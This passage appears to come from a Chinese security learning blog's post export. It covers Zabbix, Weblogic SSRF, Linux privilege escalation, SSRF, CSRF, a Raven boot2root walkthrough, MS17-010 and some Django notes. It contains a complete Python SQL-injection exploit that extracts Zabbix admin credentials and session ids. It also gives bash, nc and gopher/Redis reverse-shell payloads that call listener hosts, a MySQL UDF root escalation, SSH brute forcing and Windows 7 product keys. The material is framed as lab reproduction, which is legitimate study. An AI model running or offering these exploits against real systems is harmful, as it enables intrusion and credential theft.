3.0.x漏洞复现：https://www.jianshu.com/p/40a0e8238878 注入检测EXP附上大佬的EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env python# -*- coding: utf-8 -*-# Date: 2016/8/18# Modified by: Jamin Zhangimport urllib2import sys, osimport redef deteck_Sql(): u&apos;检查是否存在 SQL 注入&apos; payload = &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot; try: response = urllib2.urlopen(url + payload, timeout=10).read() except Exception, msg: print msg else: key_reg = re.compile(r&quot;INSERT\s*INTO\s*profiles&quot;) if key_reg.findall(response): return Truedef sql_Inject(sql): u&apos;获取特定sql语句内容&apos; payload = url + &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote( sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot; try: response = urllib2.urlopen(payload, timeout=10).read() except Exception, msg: print msg else: result_reg = re.compile(r&quot;Duplicate\s*entry\s*&apos;~(.+?)~1&quot;) results = result_reg.findall(response) if results: return results[0]if __name__ == &apos;__main__&apos;: # os.system([&apos;clear&apos;, &apos;cls&apos;][os.name == &apos;nt&apos;]) print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos; print u&apos;\t Python Zabbix &lt; 3.0.4 SQL 注入 Exploit&apos; print &apos;\t Origin Author: http://www.waitalone.cn/&apos; print &apos;\t\t Modified by: Jamin Zhang&apos; print &apos;\t\t Date: 2016-08-18&apos; print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos; if len(sys.argv) != 2: print u&apos;用法: &apos; + os.path.basename(sys.argv[0]) + u&apos; [Zabbix Server Web 后台 URL]&apos; print u&apos;实例: &apos; + os.path.basename(sys.argv[0]) + &apos; http://jaminzhang.github.io&apos; sys.exit() url = sys.argv[1] if url[-1] != &apos;/&apos;: url += &apos;/&apos; passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; if deteck_Sql(): print u&apos;Zabbix 存在 SQL 注入漏洞！\n&apos; print u&apos;管理员 用户名密码：%s&apos; % sql_Inject(passwd_sql) print u&apos;管理员 Session_id：%s&apos; % sql_Inject(session_sql) else: print u&apos;Zabbix 不存在 SQL 注入漏洞！\n&apos; 修复建议关闭 guest 访问权限，加强管理员密码强度对zabbix后台做访问控制，只允许指定IP访问zabbix-server后台 参考链接：https://www.cnblogs.com/xiewenming/p/7732144.htmlhttps://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[zabbix SQL注入漏洞复现]]></title>
    <url>%2F2018%2F12%2F21%2Fzabbix%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[环境搭建好才发现vulhub上已经有了，这里还是使用vulhub进行漏洞复现，自己搭建环境的话需要开启guest访问权限 Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）启动环境 docker-compose up -d 漏洞复现访问http://ip:8080，用账号guest（密码为空）登录游客账户登录后，查看Cookie中的zbx_sessionid，复制后16位字符payload：zabbix/latest.php?output=ajax&amp;sid=caeaeefde7aafed5&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0) Zabbix SQL(jsrpc.php) 注入漏洞漏洞产生原因：profileIdx2 参数没有被过滤利用条件：guest用户开启，允许访问影响版本：2.0.x| 2.2.x| 2.4.x| 3.0.0-3.0.3payload：zabbix/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Weblogic-SSRF-漏洞复现]]></title>
    <url>%2F2018%2F12%2F13%2FWeblogic-SSRF-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[关于SSRF漏洞的原理以及利用已经记录过了，可以访问https://www.jianshu.com/p/6bf7700139fa查看，这次复现一下这个漏洞 本次还是利用vulhub进行漏洞复现 测试环境搭建 docker-compose builddocker-compose up -d 访问http://本地ip:7001/uddiexplorer/，即可查看uddiexplorer应用 漏洞测试SSRF漏洞存在于http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，提交参数值为url:port，根据返回错误不同，可对内网状态进行探测如端口开放状态等 访问一个可以访问的ip:port，一般返回一个状态码，The server at http://192.168.60.168:7001/ returned a 404 error code &amp;#40;Not Found&amp;#41;如图 访问一个不存在的端口，将返回but could not connect over HTTP to server 访问一个非http协议，则返回did not have a valid SOAP content-type 注入HTTP头，利用Redis的反弹shell通过SSRF探测内网中的Redis的服务器，如图，172.18.0.2:6379可以连通发送三条Redis的命令，将反弹shell脚本写入/etc/crontab set 1 “\n\n\n\n * root bash -i &gt;&amp; /dev/tcp/监听ip/port 0&gt;&amp;1\n\n\n\n”config set dir /etc/config set dbfilename crontabsave 对命令进行URL编码： test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn%20%20%20%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F监听ip%2FPort%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D 攻击机开启监听，将URL编码后的字符串放在SSRF的域名后面发送，成功反弹shell 补充： / etc / crontab这个是肯定的 /etc/cron.d/*将任意文件写到该目录下，效果和crontab相同，格式也要和/ etc / crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行反弹。 / var / spool / cron / root centos系统下root用户的cron文件 / var / spool / cron / crontabs / root debian系统下root用户的cron文件 附上大佬weblogic ssrf检测脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env python # -*- coding: utf-8 -*-import reimport sysimport Queueimport requestsimport threadingfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)queue = Queue.Queue()mutex = threading.Lock()class Weblogic_SSRF_Check(threading.Thread): &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator=&#123;ip&#125;&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,html) if m: mutex.acquire() with open(&apos;ssrf.txt&apos;,&apos;a+&apos;) as f: print &quot;%s has weblogic ssrf.&quot; % domain f.write(&quot;%s has weblogic ssrf.\n&quot; % domain) mutex.release() except Exception,e: pass def get_registry(self,domain): payload = &apos;uddiexplorer/SetupUDDIExplorer.jsp&apos; url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&apos;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&apos;,html) if m: return m.group(1) except Exception,e: pass def run(self): while not self.queue.empty(): domain = self.queue.get() mutex.acquire() print domain mutex.release() ip = self.get_registry(domain) self.check(domain,ip) self.queue.task_done()# domain.txt 存放要检测的ipif __name__ == &apos;__main__&apos;: with open(&apos;domain.txt&apos;,&apos;r&apos;) as f: lines = f.readlines() for line in lines: queue.put(line.strip()) for x in xrange(1,50): t = Weblogic_SSRF_Check(queue) t.setDaemon(True) t.start() queue.join() 参考链接：http://wyb0.com/posts/weblogic-ssrf-check/https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux-提权]]></title>
    <url>%2F2018%2F12%2F12%2FLinux-%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了 常规思路： 检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release 查看内核版本(获取版本后可使用kali自带的searcsploit搜寻漏洞利用代码) uname -a 检查可用的用户及当前用户的权限 whoami 列出SUID文件（SUID目的是让本来没有相应权限的用户运行这个程序时可以访问没有权限访问的资源） find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} \;find / -user root -perm -4000 -print 2&gt;/dev/null 已知可以用来提权的linux可执行文件：nmap vim find Bash More Less Nano cp 查看安装的包、程序、运行的服务。过时的版本可能存在漏洞。 Bash 反弹 shellbash 一句话反弹 本地 nc -l -p 8080 靶机 bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1 命令 命令详解 bash -i 产生一个bash交互环境 &gt;&amp; 将联合符号前面的内容与后面相结合然后一起重定向给后者 /dev/tcp/ip/端口 linux 环境中所有的内容都是以文件的形式存在的，让主机与目标主机ip:端口建立一个TCP连接 0&gt;&amp;1 将 标准的输入 与 标准输出 内容相结合，然后重定向给前面 标准的输出 内容 详细解读过程：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 Netcat 工具反弹 开启外网主机监听 root@kali:~#nc -lvpp 4050 netcat 反弹一句话 靶机$：nc ip 端口 -t -e /bin/bash 通过靶机webshell使用nc命令建立一个ip:端口的会话连接，将本地shell通过这个会话反弹给目标主机 python 标准虚拟终端获取python一句话获取标准shell python -c “import pty;pty.spawn(‘/bin/bash’)” 命令 命令详解 -c 命令行执行 import pty 引入标准库pty pty.spawn 使用pty的spawn方法调用/bin/bash获取一个标准的shell Linux 一句话添加账户 chpasswd 方法 useradd test;echo ‘test:123456’|chpasswd useradd -p 方法 useradd -p `openssl passwd 123456` guest echo -e 方法 useradd test;echo -e “123456n123456n” |passwd test 其他的感觉不是经常使用，就没有再做笔记了]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞学习]]></title>
    <url>%2F2018%2F12%2F12%2FSSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[什么是 SSRF ？简介：SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 SSRF危害即可以实现的攻击行为 主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的Banner信息 攻击运行在内外网主机的应用程序 通过访问默认文件对内网 Web 应用进行指纹识别 攻击内外网的 Web 应用，主要是使用 GET参数就可以实现的攻击 利用file协议读取本地文件 可进行利用的协议123456FILE 读取服务器上任意文件内容IMAP/IMAPS/POP3SMTP/SMTPS 爆破邮件用户名密码FTP/FTPS FTP匿名访问、爆破DICT 操作内网Redis等服务GOPHER 能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞TFTP UDP协议扩展 使用curl -V命令可以查看Ubuntu 16.04版本下默认的libcurl支持的协议 PHP中容易造成漏洞的函数 curl_exec()file_get_contents()fsockopen() 漏洞利用 本地利用 利用方式 利用file协议查看文件 curl -v ‘file:///etc/passwd’ 利用dict探测端口 curl -v ‘dict://127.0.0.1:22’curl -v ‘dict://127.0.0.1:6379/info’ 利用gopher协议反弹shell curl -v &#39;gopher://靶机ip:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39; 更换IP和端口时，命令中的$58也要更改，$58表示字符串长度为58个字节，上面的EXP即是%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a，3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推。 注：Windows下使用curl命令需要把单引号换成双引号 远程利用 例 1 ssrf.php （未做任何ssrf防御）1234567891011121314151617&lt;?phpfunction curl($url)&#123; // 创建一个新cURL资源 $ch = curl_init(); // 设置URL和相应的选项 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); // 抓取URL并把它传递给浏览器 curl_exec($ch); // 关闭cURL资源，并且释放系统资源 curl_close($ch);&#125;$url = $_GET[&apos;url&apos;];curl($url); ?&gt;` $GET_[&#39;url&#39;]可控，从而可以发送任意请求站点，构成ssrf漏洞利用方式12345678# 利用file协议任意文件读取curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;# 利用dict协议查看端口curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;# 利用gopher协议反弹shellcurl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos; 例 2ssrf2.php 限制协议为HTTP、HTTPS 设置跳转重定向为True（默认不跳转）123456789101112131415&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True); // 限制为HTTPS、HTTP协议 curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET[&apos;url&apos;];curl($url);?&gt; 此时使用dict协议已经不成功，可以利用302跳转的方式来绕过http协议限制 漏洞寻找分享功能，通过 URL 地址分享网页内容早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的&lt;tilte&gt;&lt;/title&gt;标签或者&lt;meta name=&quot;description&quot; content=“”/&gt;标签中content的文本内容作为显示以提供更好的用户体验 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务 在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等 图片加载与下载：通过URL地址加载或下载图片图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题） 图片、文章收藏功能此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载 从URL关键字中寻找share，url，link，src，source，target，sourceURl，imageURL，domain… 未公开的api实现以及其他调用URL的功能此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。 其他数据库内置功能，比如mongodb的copyDatabase函数接收邮件服务器地址的邮件系统 漏洞防护 限制协议为HTTP、HTTPS 限制302跳转次数 统一错误信息 限制内网IP 参考链接：https://joychou.org/web/phpssrf.htmlhttp://www.mottoin.com/tech/115007.htmlhttps://feei.cn/ssrfhttps://www.jianshu.com/p/24ca56a2f5f5]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CSRF漏洞学习]]></title>
    <url>%2F2018%2F12%2F11%2FCSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[CSRF 定义跨站请求伪造，是一种“挟持用户”在当前已登录的Web应用程序上执行“非本意的操作”的攻击方法。 CSRF攻击攻击原理及过程 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF漏洞的分类及检测挖掘方法 第一种：请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。检测方法：网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。 第二种：请求是个POST请求，post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。检测方法：网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将referer也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个form表单的，然后将服务器form表单的URL作为CSRF攻击进行利用的，或者用js代码生成form表单，或者用ajax实现。 第三种：请求是POST，post请求中没有token参数，但是验证了referer信息。然而可以将post请求改写为get请求，然后通过第一种情况下的那个方法利用。检测方法：就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用$_POST而是用的类似于$_REQUEST这种post，get请求的参数都可以接收的写法。]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透测试-靶机Raven]]></title>
    <url>%2F2018%2F12%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9D%B6%E6%9C%BARaven%2F</url>
    <content type="text"><![CDATA[攻击机 ip：192.168.195.133靶机 ip：192.168.195.139 探测存活主机 root@kali:~# arp-scan -l 端口探测（nmap为例） root@kali:~# nmap -sV -p- 192.168.195.139 使用 Dirbuster 工具进行敏感目录扫描 方法一上传大马获取信息提权其中通过访问vendor目录发现PHPMailerAutoload.php文件，查询后发现CVE-2016-10033是PHPMailer中存在的高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。（见方法二） 通过访问service.html查看源代码发现flag 由于发现wordpress目录，所以使用Wpscan扫描Wpscan是一个扫描WordPress漏洞的黑盒子扫描器，可以扫描出wordpress的版本，主题，插件，后台用户以及爆破后台用户密码等 root@kali:~# wpscan –url “http://192.168.195.139/wordpress&quot; -e u vp-e 枚举方式u id 为1-10的用户名vp 扫描脆弱插件 探测到两个用户名，如图 使用hydra对其进行SSH爆破 root@kali:~# hydra -l michael -P ‘/root/Desktop/常用密码.dict’ -V -o ssh.log 192.168.195.139 ssh 破解出密码：“michael”（em…我其实没破解出来） 成功登录ssh root@kali:~#ssh michael@192.168.195.139 查询到 /var/www目录下存放flag2.txt michael@Raven:/var/www$ cat flag2.txt 在wordpress的wp_config.php里找到mysql的账户密码 michael@Raven:/var/www/html/wordpress$ vi wp-config.php 上传一个大马并访问通过连接mysql查询到flag3 flag4 提权对steven的hash值进行md5解密得到pink84由python -c ’import pty; pty.spawn(&quot;/bin/sh&quot;)’得到一个可以交互的shell，在有root密码的前提下可以su,steven是root账户成功提权至root账户 方法二利用PHPMailer命令执行以及mysql udf提权使用kali搜索漏洞有关的代码库 searchspolit phpmailer 探测到PHPMailer版本为5.2.16，这里使用pythohn远程代码执行脚本 拷贝脚本到本地 cp /usr/share/exploitdb/platforms/php/webapps/40974.py / 查看并修改相关参数 编译运行代码，成功运行后将在文件根目录下生成 wcute.php文件 本地开启监听，wcute.php 文件运行后shell成功反弹 使用python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’得到一个可以交互的shell 在wordpress的wp_config.php里找到mysql的账户密码 michael@Raven:/var/www/html/wordpress$ vi wp-config.php 使用netstat -a发现mysql服务启动查看进程发现mysql是以root权限运行的，此时想到了mysql提权，这里以udf提权为例 查询到mysql udf提权exp编号为1518，拷贝exp到本地/var/www/html cp /usr…… /var/www/html 编译生成动态链接库文件，方便上传至靶机 使用wget上传至靶机(主机开启Apache服务) 靶机连接mysql开始进行提权操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596mysql&gt; show databases;show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || wordpress |+--------------------+4 rows in set (0.22 sec)mysql&gt; use wordpressuse wordpressReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; create table foo(line blob);create table foo(line blob);Query OK, 0 rows affected (0.43 sec)mysql&gt; insert into foo values(load_file(&apos;/var/www/html/1518.so&apos;));insert into foo values(load_file(&apos;/var/www/html/1518.so&apos;));Query OK, 1 row affected (0.10 sec)mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/1518.so&apos;;select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/1518.so&apos;;Query OK, 1 row affected (0.06 sec)mysql&gt; create function do_system returns integer soname &apos;1518.so&apos;;create function do_system returns integer soname &apos;1518.so&apos;;Query OK, 0 rows affected (0.10 sec)mysql&gt; select * from mysql.func;select * from mysql.func;+-----------+-----+---------+----------+| name | ret | dl | type |+-----------+-----+---------+----------+| do_system | 2 | 1518.so | function |+-----------+-----+---------+----------+1 row in set (0.00 sec)mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);select do_system(&apos;chmod u+s /usr/bin/find&apos;);+--------------------------------------+| do_system(&apos;chmod u+s /usr/bin/find&apos;) |+--------------------------------------+| 0 |+--------------------------------------+1 row in set (0.02 sec)mysql&gt; quitquitByewww-data@Raven:/var/www/html$ touch footouch foowww-data@Raven:/var/www/html$ find foo -exec &apos;whoami&apos; \;find foo -exec &apos;whoami&apos; \;rootwww-data@Raven:/var/www/html$ find foo -exec &apos;/bin/sh&apos; \;find foo -exec &apos;/bin/sh&apos; \;# whoamiwhoamiroot# pwdpwd/var/www/html# cd /rootcd /root# lslsflag4.txt# cat flag4.txtcat flag4.txt______| ___ \| |_/ /__ ___ _____ _ __| // _` \ \ / / _ \ &apos;_ \| |\ \ (_| |\ V / __/ | | |\_| \_\__,_| \_/ \___|_| |_|flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;CONGRATULATIONS on successfully rooting Raven!This is my first Boot2Root VM - I hope you enjoyed it.Hit me up on Twitter and let me know what you thought:@mccannwj / wjmccann.github.io 成功提权 参考链接：https://www.anquanke.com/post/id/163996https://www.cnblogs.com/bmjoker/p/10034001.html]]></content>
      <categories>
        <category>靶机测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Django--（admin）]]></title>
    <url>%2F2018%2F12%2F10%2FDjango--%EF%BC%88admin%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Admin 简介 Admin 是 Django 自带的一个功能强大的自动化数据管理界面被授权的用户可直接在 Admin 中管理数据库Django 提供许多针对 Admin 的定制功能 Admin 配置 cmd 创建 admin 用户执行 python manage.py createsuperuser密码：admin123..admin 入口：localhost:8000/admin/默认英文界面，修改 settings.py 中的 LANGUAGE_CODE = ‘zh_Hans’ 可变更中文界面 配置应用 在应用下 admin.py 中引入应用自身的 models 模块（或里面的模型类）编辑 admin.py :from django.contrib import adminfrom models import Articleadmin.site.register(Article) 修改数据默认显示名称 在 models.py 的 Article 类中添加一个方法python3 使用 def str(self):return self.titlepython2 使用 def unicode(self):return self.title]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Django--（Templates）]]></title>
    <url>%2F2018%2F12%2F10%2FDjango--%EF%BC%88Templates%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在APP的根目录（应用）下创建名叫 Templates 的目录 在 Templates 目录下创建 HTML 文件 在 views.py 中返回 render（） views.py12345678from django.shortcuts import renderfrom django.http import HttpResponsedef index(request):return render(request,&apos;index.html&apos;)render(request,&apos;模板文件&apos;,context)# 前两个参数为必须，第三个参数作用是传送数据到前端，支持dict类型参数，该字典是后台传递到模板的参数，键为参数名，在模板中使用&#123;&#123;参数名&#125;&#125;来直接使用 Django 查找 Templates 规则：Django 按照 INSTALLED_APPS中的添加顺序查找 Templates不同APP下Template目录中的同名.html文件会造成冲突 解决方案：在 APP 的Templates目录下创建以 APP名为名称的目录，将HTML 文件放入新创建的目录下]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Django--（Models）]]></title>
    <url>%2F2018%2F12%2F10%2FDjango--%EF%BC%88Models%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Models通常一个 Model 对应数据库的一张数据表，Django 中 Models 以类的形式表现包含一些基本字段以及数据的一些行为 ORM对象关系映射，实现了对象和数据库之间的映射隐藏了数据访问的细节，不需要编写 SQL 语句 Models 创建 在应用根目录下创建 models.py ，并引入 models 模块（一般django自动创建） 创建类，继承 models.Model ，该类即是一张数据表 在类中创建字段，字段即类里面的属性（变量） 生成数据表 cmd 进入 manage.py 同级目录执行 python manage.py makemigrations app名（可选）执行 python manage.py migrate 数据表查看 sql 语句 Django 会自动在 app/migrations/ 目录下生成移植文件python manage.py sqlmigrate 应用名 移植文件id 页面呈现数据 后台 views.py 中 import modelsarticle = models.Article.objects.get(pk=1)render(request,page,{‘article’:article}) 前端 index.html 显示数据此时访问 http://127.0.0.1:8000/blog/ 显示id=1的 title 和 content 内容]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MS17-010漏洞复现]]></title>
    <url>%2F2018%2F12%2F09%2FMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现环境攻击机 kali靶机 Windows7（需要关闭防火墙） 漏洞复现过程 启动msf终端 msfconsole 搜索与ms17-010漏洞有关的代码库 search ms17_010 使用exp代码 use exploit/windows/smb/ms17_010_eternablue 显示代码参数选项 show options 设置目标IP地址 set RHOST X.X.X.X 执行攻击代码 exploit 成功拿到win7 shell 附上制作 Windows 7 虚拟机需要的序列号(任选其一即可) KH2J9-PC326-T44D4-39H6V-TVPBYTEP9Y-VCY3P-VVH3T-8XXCC-MF4YK236TW-X7781-8MV9F-937GT-QVKBB87VT2-FY2XW-F7K39-W3T8R-XMFGF6K2KY-BFH24-PJW6W-9GK29-TMPWPRHTBY-WWY6D-QJRJ9-JGQ3X-Q2289]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Samba远程Shell命令注入执行漏洞（CVE-2007-2447）]]></title>
    <url>%2F2018%2F12%2F09%2FSamba%E8%BF%9C%E7%A8%8BShell%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2007-2447%EF%BC%89%2F</url>
